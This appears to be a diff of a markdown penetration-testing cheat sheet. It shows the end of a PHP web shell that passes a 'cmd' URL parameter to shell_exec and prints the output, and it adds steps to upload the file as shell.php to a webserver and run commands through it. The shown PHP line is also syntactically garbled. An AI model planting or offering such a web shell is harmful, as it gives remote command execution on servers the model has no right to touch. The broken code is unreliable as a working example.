@@ -70,6 +70,8 @@ $output = shell_exec($_GET(["cmd"]);
 echo "<pre>$output</pre>";
 ?>
 ```
+> __save it as shell.php and upload this file in webserver__
+> __<url>/shell.php?cmd=id__
 
 
 # Check list
